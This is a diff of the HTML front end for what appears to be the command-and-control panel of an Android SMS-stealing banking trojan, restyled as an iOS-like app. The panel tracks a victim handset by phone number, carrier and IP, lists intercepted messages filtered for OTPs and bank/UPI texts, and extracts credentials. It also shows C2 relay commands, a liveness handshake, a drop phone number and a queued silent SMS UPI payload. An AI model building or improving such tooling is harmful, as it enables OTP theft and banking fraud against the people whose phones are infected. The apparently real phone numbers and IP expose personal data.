@@ -2,99 +2,307 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
   <title>Hacker Tracker · 03e768e104ef026d</title>
+
+  <!-- iOS PWA Meta Tags -->
+  <meta name="apple-mobile-web-app-capable" content="yes">
+  <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+  <meta name="apple-mobile-web-app-title" content="HackerTracker">
+  <meta name="theme-color" content="#000000">
+
+  <!-- Apple SF Pro & JetBrains Mono Fonts -->
   <link rel="preconnect" href="https://fonts.googleapis.com">
   <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600&family=JetBrains+Mono:wght@400;500;600&display=swap" rel="stylesheet">
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&family=JetBrains+Mono:wght@400;500;600;700&display=swap" rel="stylesheet">
+  
   <link rel="stylesheet" href="style.css">
 </head>
-<body>
-  <div class="container">
-    <!-- Header -->
-    <header class="header">
-      <div class="header-left">
-        <h1 class="logo">Hacker Tracker</h1>
-        <div class="device-id-badge" id="copyIdBtn" title="Click to copy device ID">
-          <code>03e768e104ef026d</code>
-          <span class="copy-hint" id="copyHint">copy</span>
+<body class="cupertino-dark">
+  <div class="ios-app-frame">
+    
+    <!-- iOS Top Navigation Bar -->
+    <header class="ios-nav-bar">
+      <div class="nav-bar-top">
+        <div class="device-pill" id="copyIdBtn" title="Tap to copy device ID">
+          <span class="ios-dot online" id="statusDot"></span>
+          <code id="deviceCode">03e768e104ef026d</code>
+          <span class="copy-tag" id="copyTag">copy</span>
         </div>
-        <div class="status-pill online" id="statusPill">
-          <span class="dot"></span>
-          <span id="statusText">Online</span>
+        <div class="nav-bar-actions">
+          <span class="sync-time" id="syncTime">Just now</span>
+          <button class="ios-btn-text" id="refreshBtn">Refresh</button>
         </div>
       </div>
-
-      <div class="header-right">
-        <span class="meta-item">Updated: <strong id="lastUpdated">--</strong></span>
-        <button class="btn btn-secondary" id="refreshBtn">Refresh</button>
-        <label class="auto-refresh-label">
-          <input type="checkbox" id="autoRefreshCheck" checked> Auto (15s)
-        </label>
+      <div class="nav-bar-title-row">
+        <h1 class="ios-large-title" id="pageTitle">Overview</h1>
+        <div class="vitals-chips" id="vitalsChips">
+          <span class="chip chip-battery" id="chipBattery">🔋 71%</span>
+          <span class="chip chip-network" id="chipNetwork">📶 Airtel</span>
+        </div>
       </div>
     </header>
 
-    <!-- Quick Stats Bar -->
-    <section class="stats-bar">
-      <div class="stat-item">
-        <span class="stat-label">Battery</span>
-        <span class="stat-value" id="batteryVal">--%</span>
-      </div>
-      <div class="stat-item">
-        <span class="stat-label">IP Address</span>
-        <span class="stat-value font-mono" id="ipVal">--</span>
-      </div>
-      <div class="stat-item">
-        <span class="stat-label">Phone & SIM</span>
-        <span class="stat-value font-mono" id="phoneVal">--</span>
-      </div>
-      <div class="stat-item">
-        <span class="stat-label">Model / OS</span>
-        <span class="stat-value" id="modelVal">--</span>
-      </div>
-      <div class="stat-item">
-        <span class="stat-label">C2 Command</span>
-        <span class="stat-value font-mono" id="cmdVal">--</span>
-      </div>
-      <div class="stat-item">
-        <span class="stat-label">Liveness</span>
-        <span class="stat-value font-mono text-green" id="livenessVal">--</span>
-      </div>
-      <div class="stat-item">
-        <span class="stat-label">Drop Target</span>
-        <span class="stat-value font-mono text-amber" id="dropTargetVal">--</span>
-      </div>
-    </section>
+    <!-- Tab Views Container -->
+    <main class="ios-content-viewport">
+      
+      <!-- ==================== TAB 1: OVERVIEW ==================== -->
+      <section class="tab-pane active" id="paneOverview">
+        <div class="ios-scroll-area">
+          
+          <!-- Inset Group 1: Device Telemetry -->
+          <div class="ios-group-header">DEVICE TELEMETRY</div>
+          <div class="ios-inset-group">
+            <div class="ios-cell">
+              <span class="cell-label">Connection Status</span>
+              <span class="cell-value status-text online" id="ovStatus">Online (Active C2)</span>
+            </div>
+            <div class="ios-cell">
+              <span class="cell-label">Battery Level</span>
+              <span class="cell-value font-mono" id="ovBattery">71%</span>
+            </div>
+            <div class="ios-cell">
+              <span class="cell-label">Cellular IP</span>
+              <span class="cell-value font-mono text-cyan" id="ovIp">106.211.47.194</span>
+            </div>
+            <div class="ios-cell">
+              <span class="cell-label">Carrier & Phone</span>
+              <span class="cell-value" id="ovPhone">+918433062983 (Airtel)</span>
+            </div>
+            <div class="ios-cell">
+              <span class="cell-label">Hardware Model</span>
+              <span class="cell-value" id="ovModel">OnePlus CPH2467</span>
+            </div>
+            <div class="ios-cell">
+              <span class="cell-label">Operating System</span>
+              <span class="cell-value" id="ovOs">Android 15 (SDK 35, arm64)</span>
+            </div>
+            <div class="ios-cell">
+              <span class="cell-label">Storage / MicroSD</span>
+              <span class="cell-value" id="ovStorage">104GB (SD Card: Present)</span>
+            </div>
+          </div>
 
-    <!-- Message Stream -->
-    <main class="main">
-      <div class="toolbar">
-        <div class="filters">
-          <button class="filter-btn active" data-filter="all">All (<span id="countAll">0</span>)</button>
-          <button class="filter-btn" data-filter="otp">🔑 OTPs & Codes (<span id="countOtp">0</span>)</button>
-          <button class="filter-btn" data-filter="bank">🏦 Bank / UPI (<span id="countBank">0</span>)</button>
+          <!-- Inset Group 2: C2 Gateway Relay -->
+          <div class="ios-group-header">C2 AUTO-RELAY GATEWAY</div>
+          <div class="ios-inset-group">
+            <div class="ios-cell">
+              <span class="cell-label">Designated Role</span>
+              <span class="cell-value text-amber">C2 Auto-Relay Controller</span>
+            </div>
+            <div class="ios-cell">
+              <span class="cell-label">Active Command</span>
+              <span class="cell-value font-mono text-cyan" id="ovCmd">forward status (Slot: 0)</span>
+            </div>
+            <div class="ios-cell">
+              <span class="cell-label">Liveness Handshake</span>
+              <span class="cell-value font-mono text-green" id="ovLiveness">ping_magic_scan ⇄ pong</span>
+            </div>
+            <div class="ios-cell">
+              <span class="cell-label">Drop Destination Phone</span>
+              <span class="cell-value font-mono text-amber" id="ovDropPhone">+919560241900</span>
+            </div>
+            <div class="ios-cell">
+              <span class="cell-label">Silent SMS Trigger</span>
+              <span class="cell-value text-muted" id="ovSilentSmsStatus">HDFC UPI Trigger (Queued)</span>
+            </div>
+          </div>
+
+          <!-- Inset Group 3: Quick Navigation -->
+          <div class="ios-group-header">QUICK ACTIONS</div>
+          <div class="ios-inset-group">
+            <button class="ios-cell ios-cell-btn" id="btnGoToMessages">
+              <span class="cell-label">💬 View Intercepted Messages</span>
+              <span class="cell-accessory" id="ovBadgeMsgCount">614 ›</span>
+            </button>
+            <button class="ios-cell ios-cell-btn" id="btnGoToCommands">
+              <span class="cell-label">⚡ View C2 Relay Details</span>
+              <span class="cell-accessory">›</span>
+            </button>
+            <button class="ios-cell ios-cell-btn" id="btnGoToTimeline">
+              <span class="cell-label">⏱ View History Timeline</span>
+              <span class="cell-accessory">›</span>
+            </button>
+          </div>
+
         </div>
+      </section>
 
-        <div class="search-wrap">
-          <input type="text" id="searchInput" placeholder="Search message, sender, OTP...">
-          <button id="clearSearch" class="btn-clear">✕</button>
+      <!-- ==================== TAB 2: DEDICATED MESSAGES TAB ==================== -->
+      <section class="tab-pane" id="paneMessages">
+        <div class="messages-tab-layout">
+          
+          <!-- Cupertino Search Field -->
+          <div class="ios-search-container">
+            <div class="ios-search-bar">
+              <span class="search-icon">🔍</span>
+              <input type="text" id="msgSearchInput" class="search-input" placeholder="Search sender, bank, OTP, text..." autocomplete="off">
+              <button class="btn-clear-search" id="msgClearSearch">✕</button>
+            </div>
+          </div>
+
+          <!-- Cupertino Segmented Control -->
+          <div class="ios-segmented-control-wrap">
+            <div class="ios-segmented-control">
+              <button class="seg-btn active" data-filter="all">All (<span id="segAllCount">--</span>)</button>
+              <button class="seg-btn" data-filter="otp">🔑 OTPs (<span id="segOtpCount">--</span>)</button>
+              <button class="seg-btn" data-filter="bank">🏦 Bank (<span id="segBankCount">--</span>)</button>
+              <button class="seg-btn" data-filter="carrier">📶 Airtel (<span id="segCarrierCount">--</span>)</button>
+            </div>
+          </div>
+
+          <!-- iOS Messages Stream List -->
+          <div class="ios-messages-stream" id="messagesStream">
+            <div class="ios-loading-state">
+              <div class="ios-spinner"></div>
+              <span>Loading intercepted SMS inbox...</span>
+            </div>
+          </div>
+
+          <!-- Pagination Bar -->
+          <div class="ios-paging-bar">
+            <span id="pagingSummary">Showing 0 messages</span>
+            <div class="paging-btns">
+              <button class="ios-btn-pill" id="msgPrevBtn" disabled>‹ Newer</button>
+              <span class="page-num" id="msgPageIndicator">1</span>
+              <button class="ios-btn-pill" id="msgNextBtn">Older ›</button>
+            </div>
+          </div>
+
         </div>
-      </div>
+      </section>
 
-      <!-- Messages Table / List -->
-      <div class="messages-container" id="messagesList">
-        <div class="empty">Loading messages...</div>
-      </div>
+      <!-- ==================== TAB 3: C2 COMMANDS ==================== -->
+      <section class="tab-pane" id="paneCommands">
+        <div class="ios-scroll-area">
+          <div class="ios-group-header">REALTIME C2 CONTROLLER STATE</div>
+          <div class="ios-inset-group">
+            <div class="ios-cell-stacked">
+              <span class="stacked-label">Active User Command</span>
+              <div class="stacked-code" id="cmdActiveText">forward status</div>
+              <span class="stacked-meta">Endpoint: <code>/user_data/03e768e104ef026d/command</code></span>
+            </div>
+            <div class="ios-cell">
+              <span class="cell-label">SIM Slot Index</span>
+              <span class="cell-value font-mono" id="cmdSimSlot">0</span>
+            </div>
+          </div>
 
-      <div class="footer-bar">
-        <span id="footerCount">Showing 0 messages</span>
-        <div class="pagination">
-          <button class="btn btn-secondary btn-sm" id="prevBtn" disabled>Previous</button>
-          <span class="page-num" id="pageLabel">Page 1</span>
-          <button class="btn btn-secondary btn-sm" id="nextBtn">Next</button>
+          <div class="ios-group-header">LIVENESS HANDSHAKE PROTOCOL</div>
+          <div class="ios-inset-group">
+            <div class="ios-cell">
+              <span class="cell-label">Server Probe (Command)</span>
+              <span class="cell-value font-mono text-cyan" id="cmdProbe">ping_magic_scan</span>
+            </div>
+            <div class="ios-cell">
+              <span class="cell-label">Client Handshake Response</span>
+              <span class="cell-value font-mono text-green" id="cmdResponse">pong</span>
+            </div>
+            <div class="ios-cell">
+              <span class="cell-label">Handshake Status</span>
+              <span class="cell-value text-green font-semibold">Active & Live</span>
+            </div>
+          </div>
+
+          <div class="ios-group-header">SILENT SMS WEBHOOK PAYLOAD</div>
+          <div class="ios-inset-group">
+            <div class="ios-cell">
+              <span class="cell-label">Destination Drop Handset</span>
+              <span class="cell-value font-mono text-amber" id="whPhone">+919560241900</span>
+            </div>
+            <div class="ios-cell">
+              <span class="cell-label">Delivery Dispatched</span>
+              <span class="cell-value text-amber" id="whDispatched">false (Queued)</span>
+            </div>
+            <div class="ios-cell-stacked">
+              <span class="stacked-label">Silent Payload Text</span>
+              <div class="stacked-code selectable" id="whPayloadText">HDFCUPI 8QW8KV9WFP1ilqlxfqBmG3tc6amohgyEdZwZ53iu0Fbk5pdH%2Flgty8MZURhCMBye</div>
+            </div>
+          </div>
         </div>
-      </div>
+      </section>
+
+      <!-- ==================== TAB 4: TIMELINE / EVENTS ==================== -->
+      <section class="tab-pane" id="paneTimeline">
+        <div class="ios-scroll-area">
+          <div class="ios-group-header">TELEMETRY TIMELINE & EVENTS</div>
+          <div class="ios-timeline-feed" id="timelineFeed">
+            <div class="ios-empty-state">Loading timeline...</div>
+          </div>
+        </div>
+      </section>
+
     </main>
+
+    <!-- iOS Bottom Tab Bar (Cupertino) -->
+    <nav class="ios-tab-bar">
+      <!-- Tab 1: Overview -->
+      <button class="tab-item active" data-tab="paneOverview" data-title="Overview">
+        <div class="tab-icon">
+          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+            <rect width="14" height="20" x="5" y="2" rx="2" ry="2"/>
+            <path d="M12 18h.01"/>
+          </svg>
+        </div>
+        <span class="tab-label">Overview</span>
+      </button>
+
+      <!-- Tab 2: Messages -->
+      <button class="tab-item" data-tab="paneMessages" data-title="Messages">
+        <div class="tab-icon tab-icon-badge-wrap">
+          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+            <path d="m3 21 1.9-5.7a8.5 8.5 0 1 1 3.8 3.8z"/>
+          </svg>
+          <span class="tab-badge" id="tabMsgBadge">614</span>
+        </div>
+        <span class="tab-label">Messages</span>
+      </button>
+
+      <!-- Tab 3: C2 Commands -->
+      <button class="tab-item" data-tab="paneCommands" data-title="C2 Commands">
+        <div class="tab-icon">
+          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+            <polygon points="13 2 3 14 12 14 11 22 21 10 12 10 13 2"/>
+          </svg>
+        </div>
+        <span class="tab-label">Commands</span>
+      </button>
+
+      <!-- Tab 4: Timeline -->
+      <button class="tab-item" data-tab="paneTimeline" data-title="Activity Log">
+        <div class="tab-icon">
+          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+            <circle cx="12" cy="12" r="10"/>
+            <polyline points="12 6 12 12 16 14"/>
+          </svg>
+        </div>
+        <span class="tab-label">Timeline</span>
+      </button>
+    </nav>
+
+    <!-- iOS Bottom Action Sheet / Message Detail Drawer -->
+    <div class="ios-sheet-backdrop" id="msgSheetBackdrop">
+      <div class="ios-sheet" id="msgSheet">
+        <div class="sheet-grabber"></div>
+        <div class="sheet-header">
+          <div class="sheet-sender" id="sheetSender">Sender Name</div>
+          <div class="sheet-time" id="sheetTime">Time</div>
+        </div>
+        <div class="sheet-body">
+          <div class="sheet-message" id="sheetBody">Message content</div>
+          <div class="sheet-otp-box" id="sheetOtpBox" style="display:none;">
+            <span class="otp-box-label">EXTRACTED CREDENTIAL / OTP</span>
+            <div class="otp-box-val" id="sheetOtpVal">123456</div>
+            <button class="ios-btn-blue" id="btnCopySheetOtp">Copy OTP</button>
+          </div>
+        </div>
+        <div class="sheet-actions">
+          <button class="ios-btn-secondary" id="btnCopySheetText">Copy Message Text</button>
+          <button class="ios-btn-primary" id="btnCloseSheet">Done</button>
+        </div>
+      </div>
+    </div>
+
   </div>
 
   <script src="app.js"></script>
